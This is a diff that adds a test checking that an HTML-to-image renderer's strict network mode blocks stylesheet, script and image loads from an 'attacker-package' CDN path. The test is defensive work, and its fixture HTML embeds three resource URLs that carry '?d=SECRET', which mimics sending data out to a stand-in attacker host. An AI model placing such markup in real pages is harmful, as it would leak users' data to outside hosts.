@@ -200,3 +200,25 @@ test("guardRenderPage: a symlink inside an allowed root does not reach files out
     fs.rmSync(secretDir, { recursive: true, force: true });
   }
 });
+
+test("renderHTMLToImage: strict mode blocks loads from a CDN path our templates do not use", { timeout: 120_000 }, async () => {
+  const outDir = fs.mkdtempSync(path.join(os.tmpdir(), "mulmocast-cdn-"));
+  const logged: string[] = [];
+  const info = mock.method(GraphAILogger, "info", (...args: unknown[]) => {
+    logged.push(args.map(String).join(" "));
+  });
+  const cdn = "https://cdn.jsdelivr.net/npm/attacker-package";
+  try {
+    const html = `<html><head><link rel="stylesheet" href="${cdn}/s.css?d=SECRET"><script src="${cdn}/x.js?d=SECRET"></script></head><body><img src="${cdn}/i.png?d=SECRET"></body></html>`;
+    await renderHTMLToImage(html, path.join(outDir, "out.png"), 320, 240, false, false, { strictNetwork: true });
+  } finally {
+    info.mock.restore();
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+  ["s.css", "x.js", "i.png"].forEach((file) =>
+    assert.ok(
+      logged.some((line) => line.startsWith("strict network: blocked") && line.includes(`${cdn}/${file}`)),
+      `${file} not blocked: ${logged.join("\n")}`,
+    ),
+  );
+});
